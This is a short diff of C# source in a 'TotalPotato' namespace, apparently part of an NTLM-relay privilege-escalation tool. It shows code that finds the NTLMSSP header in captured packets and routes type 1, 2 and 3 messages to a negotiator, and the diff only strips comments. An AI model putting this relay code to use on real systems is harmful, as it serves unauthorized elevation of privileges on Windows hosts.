@@ -312,9 +312,6 @@ namespace TotalPotato
 
         int FindNTLMBytes(byte[] bytes)
         {
-            //Find the NTLM bytes in a packet and return the index to the start of the NTLMSSP header.
-            //The NTLM bytes (for our purposes) are always at the end of the packet, so when we find the header,
-            //we can just return the index
             byte[] pattern = { 0x4E, 0x54, 0x4C, 0x4D, 0x53, 0x53, 0x50 };
             int pIdx = 0;
             int i;
@@ -346,17 +343,14 @@ namespace TotalPotato
             switch (messageType)
             {
                 case 1:
-                    //NTLM type 1 message
                     negotiator.HandleType1(ntlm);
                     return 0;
                 case 2:
-                    //NTLM type 2 message
                     int result = negotiator.HandleType2(ntlm);
                     Array.Copy(ntlm, 0, bytes, ntlmLoc, ntlm.Length);
                     return result;
 
                 case 3:
-                    //NTLM type 3 message
                     return negotiator.HandleType3(ntlm);
                 default:
                     Console.WriteLine("Error - Unknown NTLM message type...");
